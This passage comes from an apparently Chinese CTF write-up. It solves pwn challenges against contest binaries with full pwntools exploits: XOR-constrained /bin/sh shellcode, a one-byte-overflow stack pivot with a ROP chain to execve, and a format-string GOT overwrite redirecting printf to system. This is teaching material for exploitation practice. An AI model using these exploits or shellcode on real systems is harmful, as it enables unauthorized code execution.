&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re not up to regulation.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re not ready.&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到对shellcode的限制一共有三个，第一个是shellcode的长度必须为30，第二个是shellcode中不能有<code>\x90</code>也就是nop指令存在，最后一个就是shellcode前15个字节的xor结果必须和后15个字节相同，之后就会执行shellcode_it函数，该函数的作用就是申请一块可执行的内存，拷贝shellcode到内存中并且执行，重点就在于如何绕过xor函数，看看xor函数内部</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">xor</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 result; <span class="comment">// [rsp+17h] [rbp-5h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )                   <span class="comment">// 15</span></span><br><span class="line">    result ^= buf[i];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xor函数主要使用了迭代异或，因此我们就可以通过控制shellcode后面几个字节的值，利用异或可逆的性质来控制异或的结果。首先找一段小于29字节的shellcode，这里之所以为29主要是为了空出最后一个字节作为可控字节，这里以一个24字节长度的shellcode为例<code>\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05</code>。</p><p>之后将shellcode分为两段，第一段15个字节<code>\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f</code>，并且计算出第一段shellcode的xor结果为0xcd。</p><p>第二段9个字节<code>\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05</code>，为了满足一共30个字节的长度要求，需要在第二段shellcode后补充字节到14，这里以<code>\x5f</code>填充，也就是<code>pop %rdi</code>，填充字节的内容没有限制，可以随便填充，因为shellcode执行到syscall以后就可以执行命令了，但是不能填充<code>\x00</code>，现在第二段的shellcode就变成了<code>\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\x5f\x5f\x5f\x5f\x5f</code>，一共14字节，并且计算出其xor为0x9d，之后在shellcode2之后填充最后一个字节，该字节的值为<code>0xcd^0x9d</code>，这样就可以满足两段shellcode的xor相同，之后将两段shellcode拼接发送。最终的exp如下，拿到flag为<code>ctf&#123;can_you_write_shellcode&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;vps1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19902</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">s, len=<span class="number">0xf</span></span>):</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[:len]:</span><br><span class="line">        result ^= ord(i)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># xor(shellcode1) = 0xcd</span></span><br><span class="line">shellcode1 = <span class="string">&#x27;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># xor(shellcode2) = 0x9d</span></span><br><span class="line">shellcode2 = <span class="string">&#x27;\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line"><span class="keyword">while</span> len(shellcode2) != <span class="number">14</span>:</span><br><span class="line">    shellcode2 += <span class="string">&#x27;\x5f&#x27;</span>  <span class="comment"># pop %rdi</span></span><br><span class="line">shellcode2 += chr(xor(shellcode1) ^ xor(shellcode2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> xor(shellcode2) == xor(shellcode1)</span><br><span class="line"></span><br><span class="line">shellcode = shellcode1 + shellcode2</span><br><span class="line"><span class="keyword">assert</span> len(shellcode) == <span class="number">30</span></span><br><span class="line"></span><br><span class="line">conn.sendafter(<span class="string">&#x27;Send me your drift\n&#x27;</span>, shellcode)</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwndelta-200"><a href="#pwndelta-200" class="headerlink" title="pwndelta(200)"></a>pwndelta(200)</h1><p>这道题开启了NX，并且去符号化静态编译，通过老办法找到程序的入口sub_400C46，栈溢出的点位于函数sub_400BD2内部的sub_400B73。首先程序读入一个数字，该数字必须小于等于257，这个数字即为sub_400B73读取到buf的长度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">overflow</span><span class="params">(<span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-100h]</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ok, what do you have to say for yourself?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, length);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Interesting thought \&quot;%s\&quot;, I&#x27;ll take it into consideration.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到buf的大小为256，而可以读取最大的字节数为257，所以只能溢出一个字节，再看上一层函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400BD2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">9</span>]; <span class="comment">// [rsp+2h] [rbp-Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+Bh] [rbp-5h]</span></span><br><span class="line">  <span class="keyword">int</span> length; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;how much do you have to say?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">9u</span>LL);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  length = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s not much to say.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= <span class="number">257</span> )</span><br><span class="line">    <span class="keyword">return</span> overflow(length);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s too much to say!.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于对length限制了上限于下限，所以257这个数字是不能绕过的，因此我们只能利用那溢出的一个字节来修改esp。这道题的思路就是利用溢出的一字节将栈抬升到我们的输入出，控制了栈顶以后就控制了ret，之后再利用rop执行系统调用即可。</p><p>在sub_400BD2中，由于<code>return overflow(length);</code>，因此汇编代码中将会出现两次连续的leave和ret</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>首先第一次leave将栈中被我们修改了的old rbp弹出到rbp中，这时rbp被我们控制，rbp将会被抬高（即栈底在栈顶的上面），执行完第一个ret以后又是一个leave，首先<code>mov rsp rbp</code>将被我们修改了的rbp移动到rsp中，这时我们就控制了栈顶，之后执行ret指令就可以弹出站上的一个地址并且跳转到地址去执行指令，可以形成rop。</p><p>我们一共最多可以输入256个字节，但是由于ASLR，所以我们并不能知道将栈抬升到那里才刚好可以执行rop，所以可以在栈上先填充类似nop指令到ret指令，填充的越多命中的相对概率越大，只要命中了一条ret，就可以一直<code>pop rip</code>到rop开始的地方。</p><p>exp如下，可能需要多尝试几次才行，由于开启了ASLR，所以每次栈的位置不固定，可以尝试修改<code>\x00</code>将esp移动到合适的地方，取值范围<code>[0x00, 0xf8]</code>，必须是8的倍数，不过还是得看脸才能命中ret，最后拿到flag<code>ctf&#123;yeT_thls_ls_4nOTHer_sH3Ilcod3_ch4!!3ng3&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;vps1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19903</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ROP Gadgets:</span></span><br><span class="line"><span class="string">    0x0000000000400416 : ret</span></span><br><span class="line"><span class="string">    0x0000000000415f04 : pop rax ; ret</span></span><br><span class="line"><span class="string">    0x0000000000400686 : pop rdi ; ret</span></span><br><span class="line"><span class="string">    0x0000000000410a93 : pop rsi ; ret</span></span><br><span class="line"><span class="string">    0x000000000044a155 : pop rdx ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .text:00000000004498E5                 syscall                 ; LINUX - sys_alarm</span></span><br><span class="line"><span class="string">    .text:00000000004498E7                 cmp     rax, 0FFFFFFFFFFFFF001h</span></span><br><span class="line"><span class="string">    .text:00000000004498ED                 jnb     short loc_4498F0</span></span><br><span class="line"><span class="string">    .text:00000000004498EF                 retn</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000400416</span></span><br><span class="line">pop_rax_ret = <span class="number">0x0000000000415f04</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400686</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000410a93</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000044a155</span></span><br><span class="line">syscall = <span class="number">0x00000000004498E5</span></span><br><span class="line">bss_buf = <span class="number">0x6BB300</span></span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;how much do you have to say?\n&#x27;</span>, <span class="string">&#x27;257&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = pg.get(256)+&#x27;\x80&#x27;</span></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rax_ret, <span class="number">0x0</span>,  <span class="comment"># read syscall</span></span><br><span class="line">    pop_rdi_ret, <span class="number">0x0</span>, pop_rsi_ret, bss_buf, pop_rdx_ret, <span class="number">0x8</span>, syscall,</span><br><span class="line">    pop_rax_ret, <span class="number">0x3b</span>, <span class="comment"># execve syscall</span></span><br><span class="line">    pop_rdi_ret, bss_buf, pop_rsi_ret, <span class="number">0x0</span>, pop_rdx_ret, <span class="number">0x0</span>, syscall</span><br><span class="line">], word_size=<span class="number">64</span>)</span><br><span class="line">payload = (p64(ret) * ((<span class="number">256</span> - len(payload))/<span class="number">8</span>)) + payload + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> len(payload) == <span class="number">257</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">conn.sendafter(<span class="string">&#x27;Ok, what do you have to say for yourself?\n&#x27;</span>, payload+<span class="string">&#x27;//bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwnepsilon-200"><a href="#pwnepsilon-200" class="headerlink" title="pwnepsilon(200)"></a>pwnepsilon(200)</h1><p>题目的源码非常简单，buf长度为1032，读入1024字节，相差8字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_40069D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-410h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What do you mean this time? &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">1024u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Interesting &quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; food for thought&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到直接有<code>  printf(buf);</code>，所以存在一个格式化字符串漏洞，我们最终的目的就是劫持got表，将got表中的printf函数修改为system，不过首先我们需要能够让程序多次执行<code>  printf(buf)</code>才可以多次触发payload。</p><p>因为每次printf之后都会调用一次puts函数，所以我们可以将puts函数在got表中的值修改为sub_40069D的地址，这样每次调用puts函数就可以重新进入sub_40069D执行<code>printf(buf)</code>，再通过pwndbg的fmtarg确定参数偏移为6以后就可以使用pwntools的fmtstr_payload生成任意写的payload了。需要注意的是64位系统中printf函数的前六个参数会存储在寄存器中，除去第一个参数作为格式化字符串以外，后面五个参数会存放在寄存器中，第六个参数才会从栈中获取，这就是为什么虽然我们输入的payload在栈顶，但是fmtarg计算出的偏移却是6。</p><p>由于题目中没有给libc，所以下一步的目标就是泄漏一个got函数的地址，由于我们已经将puts的got地址修改为sub_40069D，所以这次泄漏read函数，payload为<code>&#39;&#123;&#123;%7$s&#125;&#125;&#39; + p64(elf.got[&#39;read&#39;])</code>。</p><p>拿到libc以后就可以计算出system函数的地址，之后再将printf在got表中的地址修改为system函数的地址即可，这样每次调用printf函数就相当于调用system函数。</p><p>最终的exp如下，最后拿到flag<code>ctf&#123;fOrmat_s7rIng_vu!_stop_uslng_17&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;vps1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19904</span></span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">payload</span>):</span></span><br><span class="line">    conn.sendafter(<span class="string">&#x27;What do you mean this time? &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn(fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;puts&#x27;</span>]: <span class="number">0x40069D</span>&#125;))</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">r&#x27;&#123;&#123;%7$s&#125;&#125;&#x27;</span> + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">conn.recvuntil(<span class="string">r&#x27;&#123;&#123;&#x27;</span>)</span><br><span class="line">read_addr = u64(conn.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;read address: &#x27;</span> + hex(read_addr))</span><br><span class="line"></span><br><span class="line">got_addr = read_addr - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr = got_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;system address: &#x27;</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line">pwn(fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]: system_addr&#125;))</span><br><span class="line">conn.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwnzeta-200"><a href="#pwnzeta-200" class="headerlink" title="pwnzeta(200)"></a>pwnzeta(200)</h1><p>这题和pwngamma很像，只能输入26字节的shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">get_that_shellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">26</span>]; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+2Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Send me your ride&quot;</span>);</span><br><span class="line">  v0 = read(<span class="number">0</span>, buf, <span class="number">26u</span>LL);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">26</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(buf) == <span class="number">26</span> )</span><br><span class="line">      shellcode_it(buf, <span class="number">26L</span>L);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re not up to code.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You ain&#x27;t ready.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看shellcode_it</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">shellcode_it</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// ST78_8</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST50_4 OVERLAPPED</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// ST54_1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST56_4 OVERLAPPED</span></span><br><span class="line">  __int64 v5; <span class="comment">// ST5B_8 OVERLAPPED</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// ST63_1</span></span><br><span class="line">  __int128 v7; <span class="comment">// ST65_16 OVERLAPPED</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// ST55_1</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// ST5A_1</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// 